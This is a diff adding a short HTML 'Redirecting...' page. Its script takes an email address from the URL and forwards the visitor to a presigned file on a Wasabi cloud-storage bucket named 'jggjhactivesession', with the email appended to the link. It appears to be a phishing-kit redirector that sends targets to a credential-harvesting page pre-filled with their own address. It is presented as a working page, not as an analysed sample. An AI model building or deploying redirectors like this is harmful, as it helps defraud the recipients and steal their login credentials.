@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <script>
+        // Wait until the DOM is fully loaded
+        window.addEventListener("DOMContentLoaded", function () {
+            const urlParams = new URLSearchParams(window.location.search);
+            const email = urlParams.get('email');
+
+            // Set base redirect URL
+            let redirectUrl = 'https://s3.eu-west-1.wasabisys.com/jggjhactivesession/3289.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=JW18WQ9EGT9TYKIF8S3L%2F20250630%2Feu-west-1%2Fs3%2Faws4_request&X-Amz-Date=20250630T175138Z&X-Amz-Expires=43200&X-Amz-Signature=cfc2147814c6d12dc0343a0a3e90c71d82ec3d3046392208c3d60c55028a1d54&X-Amz-SignedHeaders=host&x-id=GetObject';
+
+            // If email parameter exists, append it
+            if (email) {
+                redirectUrl += `#${encodeURIComponent(email)}#Activesessions`;
+            }
+
+            // Redirect
+            window.location.href = redirectUrl;
+        });
+    </script>
+</head>
+<body>
+    <p>Redirecting, please wait...</p>
+</body>
+</html>
